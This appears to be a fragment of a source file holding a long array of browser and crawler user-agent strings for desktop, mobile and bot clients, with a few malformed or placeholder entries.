  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322))",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36)",
  "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",

  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",

  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",

  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",

  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",

  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",

  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",

  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",

  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",

  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",

  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",

  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",

/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",

  "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",

  "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",

  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",

  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",

  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",

  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",

  "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",

  "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",

  "Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36",

  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",

  "Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",

  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24",

  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36",

  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",

  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",

  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2",

  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)",

  "Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",

  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",

  "MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",

  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",

  "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",

  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",

  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",

  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",

  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)",

  "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",

  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",

  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",

  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",

  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",

  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",

  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",

  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",

  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",

  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",

  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",

  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",

  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",

  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",

  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",

  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",

  "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",

  "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",

  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",

  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",

  "Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0",

  "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",

  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",

  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",

  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",

  "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",

  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",

  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",

  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",

  "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",

  "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",

  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",

  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",

  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",

    "Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",

  "Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",

  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",

  "Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",

  "Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",

  "Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",

  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",

  "Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15",

  "Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",

  "nokia-7.1-safari",

  "NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",

  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",

  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",

  "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",

  "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",

  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",

  "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",

  "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",

  "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",

  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0",

  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",

  "Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",

  "Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0",

  "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",

  "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",

  "Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",

  "Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0",

  "Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0",

  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",

  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36",

  "Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/",

  "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",

  "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",

  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",

  "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",

  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",

  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",

  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",

  "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",

  "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",

